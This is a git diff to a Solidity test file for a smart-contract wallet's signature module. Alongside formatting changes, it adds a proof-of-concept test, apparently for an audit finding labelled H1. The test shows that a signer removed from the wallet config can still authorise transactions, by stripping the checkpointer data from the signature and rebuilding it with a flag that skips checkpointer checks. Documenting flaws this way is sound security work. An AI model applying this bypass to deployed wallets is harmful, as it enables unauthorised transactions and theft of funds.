c482afccd9d915b73aa055a3f97713f3b4c6c6ac
gsangeryee <gsangeryeee@gmail.com>
2025-12-13 06:23:10 +0800

    add PoC for H1

--- test/modules/BaseSig.t.sol
+++ test/modules/BaseSig.t.sol
@@ -10,6 +10,8 @@ import { PrimitivesRPC } from "../utils/PrimitivesRPC.sol";
 import { AdvTest } from "../utils/TestUtils.sol";
 import { Vm } from "forge-std/Test.sol";
 
+import { console } from "forge-std/console.sol";
+
 contract BaseSigImp {
 
   function recoverPub(
@@ -31,7 +33,10 @@ contract BaseSigTest is AdvTest {
     baseSigImp = new BaseSigImp();
   }
 
-  function test_recover_random_config_unsigned(uint256 _maxDepth, uint256 _seed) external {
+  function test_recover_random_config_unsigned(
+    uint256 _maxDepth,
+    uint256 _seed
+  ) external {
     _maxDepth = bound(_maxDepth, 1, 6);
 
     Payload.Decoded memory payload;
@@ -493,7 +498,9 @@ contract BaseSigTest is AdvTest {
 
         vm.mockCall(
           address(params.signer),
-          abi.encodeWithSelector(ISapientCompact.recoverSapientSignatureCompact.selector, payloadHash, params.signature),
+          abi.encodeWithSelector(
+            ISapientCompact.recoverSapientSignatureCompact.selector, payloadHash, params.signature
+          ),
           abi.encode(params.sapientImageHash)
         );
 
@@ -845,15 +852,17 @@ contract BaseSigTest is AdvTest {
     string memory ce;
 
     for (uint256 i = 0; i < params.prefix.length; i++) {
-      ce =
-        string.concat(ce, "signer:", vm.toString(params.prefix[i].addr), ":", vm.toString(params.prefix[i].weight), " ");
+      ce = string.concat(
+        ce, "signer:", vm.toString(params.prefix[i].addr), ":", vm.toString(params.prefix[i].weight), " "
+      );
     }
 
     ce = string.concat(ce, "subdigest:", vm.toString(opHash));
 
     for (uint256 i = 0; i < params.suffix.length; i++) {
-      ce =
-        string.concat(ce, " ", "signer:", vm.toString(params.suffix[i].addr), ":", vm.toString(params.suffix[i].weight));
+      ce = string.concat(
+        ce, " ", "signer:", vm.toString(params.suffix[i].addr), ":", vm.toString(params.suffix[i].weight)
+      );
     }
 
     string memory config = PrimitivesRPC.newConfig(vm, params.threshold, params.checkpoint, ce);
@@ -891,15 +900,17 @@ contract BaseSigTest is AdvTest {
     string memory ce;
 
     for (uint256 i = 0; i < params.prefix.length; i++) {
-      ce =
-        string.concat(ce, "signer:", vm.toString(params.prefix[i].addr), ":", vm.toString(params.prefix[i].weight), " ");
+      ce = string.concat(
+        ce, "signer:", vm.toString(params.prefix[i].addr), ":", vm.toString(params.prefix[i].weight), " "
+      );
     }
 
     ce = string.concat(ce, "any-address-subdigest:", vm.toString(expectedAnyAddressDigest));
 
     for (uint256 i = 0; i < params.suffix.length; i++) {
-      ce =
-        string.concat(ce, " ", "signer:", vm.toString(params.suffix[i].addr), ":", vm.toString(params.suffix[i].weight));
+      ce = string.concat(
+        ce, " ", "signer:", vm.toString(params.suffix[i].addr), ":", vm.toString(params.suffix[i].weight)
+      );
     }
 
     string memory config = PrimitivesRPC.newConfig(vm, params.threshold, params.checkpoint, ce);
@@ -2545,6 +2556,81 @@ contract BaseSigTest is AdvTest {
       vm.expectRevert(abi.encodeWithSelector(BaseSig.UnusedSnapshot.selector, vars.snapshot));
       baseSigImp.recoverPub(params.payload, vars.chainedSignature, false, address(0));
     }
+  }
+
+  function test_PoC_checkpointer_bypass() external {
+    (address alice, uint256 aliceKey) = makeAddrAndKey("alice");
+    (address bob, uint256 bobKey) = makeAddrAndKey("bob");
+
+    address checkpointer = address(0xBEEF);
+
+    uint256 checkpoint1 = 1;
+    uint256 checkpoint2 = 2;
+
+    string memory url = string.concat(
+      vm.envString("SEQ_SDK_RPC_URL_PREFIX"),
+      vm.toString(vm.envUint("SEQ_SDK_RPC_MIN_PORT")),
+      vm.envString("SEQ_SDK_RPC_URL_SUFFIX")
+    );
+    console.log(url);
+
+    // Let's assume config1 is currently where the wallet contract is at, while the checkpointer is ahead at config2
+    string memory config1 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointer, 1, checkpoint1, string(abi.encodePacked("signer:", vm.toString(alice), ":1"))
+    );
+    // In config2 Alice is no longer a signer so she shouldn't be able to authorise any more transactions
+    string memory config2 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointer, 1, checkpoint2, string(abi.encodePacked("signer:", vm.toString(bob), ":2"))
+    );
+
+    Payload.Decoded memory finalPayload;
+    finalPayload.kind = Payload.KIND_TRANSACTIONS;
+
+    Snapshot memory latestSnapshot = Snapshot(PrimitivesRPC.getImageHash(vm, config2), 2);
+
+    bytes memory chainedSignature;
+    {
+      (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, Payload.hashFor(finalPayload, address(baseSigImp)));
+
+      // One and only signature within the chain which is valid for config1 (currently out of date)
+      bytes memory signature = PrimitivesRPC.toEncodedSignature(
+        vm,
+        config1,
+        string(
+          abi.encodePacked(vm.toString(alice), ":hash:", vm.toString(r), ":", vm.toString(s), ":", vm.toString(v))
+        ),
+        true
+      );
+
+      // Remove checkpointer data from the signature
+      bytes memory adjustedSignature = new bytes(signature.length - 3);
+      for (uint256 i = 0; i < adjustedSignature.length; i++) {
+        if (i < 21) {
+          adjustedSignature[i] = signature[i];
+        } else {
+          adjustedSignature[i] = signature[i + 3];
+        }
+      }
+
+      // Construct the chained signature
+      bytes1 outerFlag = bytes1(uint8(0x5)); // 0b000 001 01 => no checkpointer usage
+      uint24 innerSigSize = uint24(adjustedSignature.length);
+      chainedSignature = new bytes(adjustedSignature.length + 4);
+      chainedSignature[0] = outerFlag;
+      chainedSignature[1] = bytes1(uint8(innerSigSize >> 16));
+      chainedSignature[2] = bytes1(uint8(innerSigSize >> 8));
+      chainedSignature[3] = bytes1(uint8(innerSigSize));
+      for (uint256 i = 4; i < chainedSignature.length; i++) {
+        chainedSignature[i] = adjustedSignature[i - 4];
+      }
+    }
+
+    vm.mockCall(checkpointer, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot));
+
+    (uint256 threshold, uint256 weight, bytes32 imageHash,,) =
+      baseSigImp.recoverPub(finalPayload, chainedSignature, false, address(0));
+    assertGe(weight, threshold, "Weight must at least reach threshold");
+    assertEq(imageHash, PrimitivesRPC.getImageHash(vm, config1), "Must have correct image hash");
   }
 
 }
